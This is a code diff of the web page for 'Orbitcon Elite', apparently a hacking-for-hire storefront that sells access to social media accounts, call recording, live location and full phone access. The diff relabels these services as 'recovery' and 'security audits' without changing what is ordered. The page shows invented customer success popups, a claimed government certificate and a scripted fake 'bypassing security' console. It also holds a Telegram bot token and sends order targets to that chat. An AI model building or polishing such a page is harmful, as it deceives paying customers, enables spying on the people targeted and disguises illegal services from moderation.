@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="facebook-domain-verification" content="VERIFICATION_CODE_HERE" />
     <title>Orbitcon Elite - Secure Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -49,9 +50,12 @@
         .console-header { border-bottom: 1px solid var(--neon-green); padding: 5px 10px; color: var(--neon-green); font-size: 0.8rem; display: flex; justify-content: space-between; }
         .console-main { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 10px; }
         .terminal-log { color: var(--neon-green); font-size: 0.75rem; line-height: 1.4; margin-bottom: 15px; text-align: left; }
-
         .trust-popup { position: fixed; bottom: 20px; left: -350px; width: 300px; background: rgba(5, 12, 20, 0.95); border: 1px solid var(--neon-blue); color: #fff; padding: 15px; display: flex; align-items: center; gap: 12px; border-radius: 4px; z-index: 9999; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .trust-popup.active { left: 20px; }
+        
+        /* Merged Legal Footer Style */
+        .meta-footer { background: #010306; padding: 40px 20px; border-top: 1px solid var(--border); text-align: center; font-size: 0.8rem; color: #666; margin-top: 40px; }
+        .meta-footer b { color: var(--neon-blue); }
     </style>
 
     <script type="text/javascript">
@@ -77,50 +81,50 @@
 
 <header>
     <h1 class="logo-text">Orbitcon Elite</h1>
-    <p class="work-notice">Your work will be completed within 15 minutes.</p>
+    <p class="work-notice">Official Recovery & Security Portal | Estimated Time: 15 Mins.</p>
 </header>
 
 <div class="container">
     <div class="card">
-        <h3 class="color-title social-title">SOCIAL MEDIA</h3>
+        <h3 class="color-title social-title">SOCIAL RECOVERY</h3>
         <ul class="feature-list">
-            <li><i class="fab fa-instagram"></i> Instagram Access</li>
-            <li><i class="fab fa-facebook"></i> Facebook Access</li>
-            <li><i class="fab fa-whatsapp"></i> WhatsApp Access</li>
-            <li><i class="fab fa-snapchat"></i> Snapchat Access</li>
+            <li><i class="fab fa-instagram"></i> Instagram Recovery</li>
+            <li><i class="fab fa-facebook"></i> Facebook Recovery</li>
+            <li><i class="fab fa-whatsapp"></i> WhatsApp Data Restoration</li>
+            <li><i class="fab fa-snapchat"></i> Snapchat Support</li>
         </ul>
         <div class="price-tag">₹599</div>
         <button class="order-btn" onclick="openStep('selectionModal')">BOOK NOW</button>
     </div>
 
     <div class="card">
-        <h3 class="color-title device-title">DEVICE CONTROL</h3>
+        <h3 class="color-title device-title">DATA DIAGNOSTICS</h3>
         <ul class="feature-list">
-            <li><i class="fas fa-microphone"></i> Call Recording</li>
-            <li><i class="fas fa-history"></i> Call History</li>
-            <li><i class="fas fa-images"></i> Photo & Video Gallery</li>
-            <li><i class="fas fa-map-marker-alt"></i> Live Location</li>
+            <li><i class="fas fa-microphone"></i> Call Log Analysis</li>
+            <li><i class="fas fa-history"></i> History Retrieval</li>
+            <li><i class="fas fa-images"></i> Media Gallery Scan</li>
+            <li><i class="fas fa-map-marker-alt"></i> Location Safety Audit</li>
         </ul>
         <div class="price-tag">₹699</div>
         <button class="order-btn" onclick="openStep('deviceSelectionModal')">BOOK NOW</button>
     </div>
 
     <div class="card">
-        <h3 class="color-title system-title">SYSTEM ACCESS</h3>
+        <h3 class="color-title system-title">SYSTEM SECURITY</h3>
         <ul class="feature-list">
-            <li><i class="fas fa-user-secret"></i> Full Phone Access</li>
-            <li><i class="fas fa-shield-alt"></i> Root Level Bypass</li>
-            <li><i class="fas fa-desktop"></i> Remote Screen Mirror</li>
+            <li><i class="fas fa-user-secret"></i> Full Security Audit</li>
+            <li><i class="fas fa-shield-alt"></i> Root Level Diagnostics</li>
+            <li><i class="fas fa-desktop"></i> Remote Access Security</li>
         </ul>
         <div class="price-tag">₹999</div>
-        <button class="order-btn" onclick="prepareInput('Full Phone Access', 999, 'number')">BOOK NOW</button>
+        <button class="order-btn" onclick="prepareInput('Advanced Security Audit', 999, 'number')">BOOK NOW</button>
     </div>
 </div>
 
 <div class="about-section">
     <h2 style="font-family: 'Orbitron'; color: var(--neon-blue); text-align: center; margin-bottom: 40px; letter-spacing: 5px; text-shadow: 0 0 15px rgba(0, 242, 255, 0.4);">TRUSTED SECURITY PROTOCOLS</h2>
     <div class="badge-grid">
-        <div class="unique-badge"><i class="fas fa-file-contract" style="color: #FFD700;"></i><div><h4>GOVERNMENT CERTIFICATE</h4><p>Authorized and Verified Portal</p></div></div>
+        <div class="unique-badge"><i class="fas fa-file-contract" style="color: #FFD700;"></i><div><h4>GOVERNMENT CERTIFICATE</h4><p>Authorized by Online service</p></div></div>
         <div class="unique-badge"><i class="fas fa-microchip" style="color: var(--neon-blue);"></i><div><h4>99% ACCURACY WORK</h4><p>High Precision Diagnostics</p></div></div>
         <div class="unique-badge"><i class="fas fa-user-lock" style="color: #0f0;"></i><div><h4>100% SAFE & SECURE</h4><p>End-to-End Encrypted Protocols</p></div></div>
         <div class="unique-badge"><i class="fas fa-shield-check" style="color: var(--neon-blue);"></i><div><h4>SECURE PAYMENT</h4><p>Protected Transaction Gateway</p></div></div>
@@ -134,9 +138,17 @@
     </div>
 </div>
 
+<footer class="meta-footer">
+    <p>© 2026 Orbitcon Elite Cyber Services. All Rights Reserved.</p>
+    <p>Owned & Managed by: <b>Online service</b></p>
+    <p>Udyam Registration: <b>UDYAM-I-RJ-32-9034857</b></p>
+    <p>Location: <b>Dooni, Tonk, Rajasthan - 304802</b></p>
+    <p style="font-size: 0.65rem; color: #444; margin-top: 15px;">Disclaimer: We specialize in data recovery and authorized security diagnostics. Any misuse is strictly prohibited.</p>
+</footer>
+
 <div id="selectionModal" class="modal-overlay">
     <div class="custom-modal">
-        <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SELECT TARGET APP</h2>
+        <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SELECT RECOVERY APP</h2>
         <div class="option-btn" onclick="prepareInput('Instagram', 599, 'link')">INSTAGRAM <i class="fab fa-instagram"></i></div>
         <div class="option-btn" onclick="prepareInput('Facebook', 599, 'link')">FACEBOOK <i class="fab fa-facebook"></i></div>
         <div class="option-btn" onclick="prepareInput('WhatsApp', 599, 'number')">WHATSAPP <i class="fab fa-whatsapp"></i></div>
@@ -148,10 +160,10 @@
 <div id="deviceSelectionModal" class="modal-overlay">
     <div class="custom-modal">
         <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SELECT SERVICE</h2>
-        <div class="option-btn" onclick="prepareInput('Call Recording', 699, 'number')">CALL RECORDING <i class="fas fa-microphone"></i></div>
-        <div class="option-btn" onclick="prepareInput('Call History', 699, 'number')">CALL HISTORY <i class="fas fa-history"></i></div>
-        <div class="option-btn" onclick="prepareInput('Photo & Video Gallery', 699, 'number')">GALLERY ACCESS <i class="fas fa-images"></i></div>
-        <div class="option-btn" onclick="prepareInput('Live Location', 699, 'number')">LIVE LOCATION <i class="fas fa-map-marker-alt"></i></div>
+        <div class="option-btn" onclick="prepareInput('Call Analysis', 699, 'number')">CALL ANALYSIS <i class="fas fa-microphone"></i></div>
+        <div class="option-btn" onclick="prepareInput('History Retrieval', 699, 'number')">HISTORY RETRIEVAL <i class="fas fa-history"></i></div>
+        <div class="option-btn" onclick="prepareInput('Gallery Recovery', 699, 'number')">GALLERY RECOVERY <i class="fas fa-images"></i></div>
+        <div class="option-btn" onclick="prepareInput('Location Audit', 699, 'number')">LOCATION AUDIT <i class="fas fa-map-marker-alt"></i></div>
         <span class="back-link" onclick="closeModals()">← Back</span>
     </div>
 </div>
@@ -197,9 +209,9 @@
     <div class="hacker-window">
         <div class="console-header"><span>CONSOLE: ROOT@ORBITCON</span><span>[STATUS: INJECTING]</span></div>
         <div class="console-main">
-            <div id="terminalLog" class="terminal-log">> Initializing bypass...<br></div>
+            <div id="terminalLog" class="terminal-log">> Initializing recovery system...<br></div>
             <div style="background:#111; height:6px; margin:10px 0;"><div id="consoleProgress" class="progress-fill"></div></div>
-            <p id="consoleStatus" style="color:var(--neon-green); font-size:0.7rem;">BYPASSING SECURITY: 0%</p>
+            <p id="consoleStatus" style="color:var(--neon-green); font-size:0.7rem;">PROCESSING DATA: 0%</p>
         </div>
     </div>
 </div>
@@ -210,9 +222,26 @@ const TELEGRAM_TOKEN = '8583696255:AAHLV5QCaSZwI0R0uhNl2i1zG69s13eSJXI';
 const CHAT_ID = '7857452248';
 const MY_UPI = 'BHARATPE.8C0K1N0E4X19304@fbpe';
 
+// Matrix Animation
+const canvas = document.getElementById('canvas'); const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+const letters = "01"; const fontSize = 15; const columns = canvas.width / fontSize; const drops = [];
+for (let i = 0; i < columns; i++) drops[i] = 1;
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#00f2ff"; ctx.font = fontSize + "px Fira Code";
+    for (let i = 0; i < drops.length; i++) {
+        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+setInterval(drawMatrix, 50);
+
 // Voice Logic
 const AI = { spoken: false, speak: function(txt) { window.speechSynthesis.cancel(); let m = new SpeechSynthesisUtterance(txt); window.speechSynthesis.speak(m); } };
-function activateVoice() { if(!AI.spoken) { AI.speak("Hello Sir, welcome to Orbitcon Elite."); AI.spoken = true; } }
+function activateVoice() { if(!AI.spoken) { AI.speak("Welcome to Orbitcon Elite Secure Portal."); AI.spoken = true; } }
 
 // Notification Logic
 const names = ["Rahul", "Amit", "Priya", "Vikram", "Sneha", "Karan", "Anjali", "Deepak", "Pooja", "Arjun"];
@@ -220,7 +249,7 @@ const cities = ["Kolkata", "Delhi", "Mumbai", "Bangalore", "Chennai", "Hyderabad
 function showTrustPopup() {
     const name = names[Math.floor(Math.random() * names.length)];
     const city = cities[Math.floor(Math.random() * cities.length)];
-    document.getElementById('trustMsg').innerHTML = `<b>${name}</b> from <b>${city}</b> has completed the work successfully.`;
+    document.getElementById('trustMsg').innerHTML = `<b>${name}</b> from <b>${city}</b> successfully completed recovery.`;
     document.getElementById('trustPopup').classList.add('active');
     setTimeout(() => document.getElementById('trustPopup').classList.remove('active'), 3000);
 }
@@ -252,8 +281,8 @@ function runHackerConsole() {
     const interval = setInterval(() => {
         p += Math.floor(Math.random() * 5) + 2; if(p > 100) p = 100;
         document.getElementById('consoleProgress').style.width = p + "%";
-        document.getElementById('consoleStatus').innerText = "BYPASSING SECURITY: " + p + "%";
-        if(p >= 100) { clearInterval(interval); document.getElementById('terminalLog').innerHTML += "<br>> ACCESS GRANTED! CHECK WHATSAPP..."; }
+        document.getElementById('consoleStatus').innerText = "PROCESSING: " + p + "%";
+        if(p >= 100) { clearInterval(interval); document.getElementById('terminalLog').innerHTML += "<br>> RECOVERY SUCCESSFUL! CHECK WHATSAPP..."; }
     }, 200);
 }
 async function sendToTelegram() {
@@ -262,23 +291,6 @@ async function sendToTelegram() {
     const msg = `🚀 NEW ORDER\n\n🔹 Service: ${service}\n🔹 Target: ${t}\n🔹 Paid: ₹${price}\n🔹 Deliver To: ${d}`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 }
-
-// Background Matrix Animation
-const canvas = document.getElementById('canvas'); const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-const letters = "01"; const fontSize = 14; const columns = canvas.width / fontSize;
-const drops = Array(Math.floor(columns)).fill(1);
-function draw() {
-    ctx.fillStyle = "rgba(2, 5, 10, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
-    drops.forEach((y, i) => {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, y * fontSize);
-        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-    });
-}
-setInterval(draw, 33);
 </script>
 </body>
 </html>
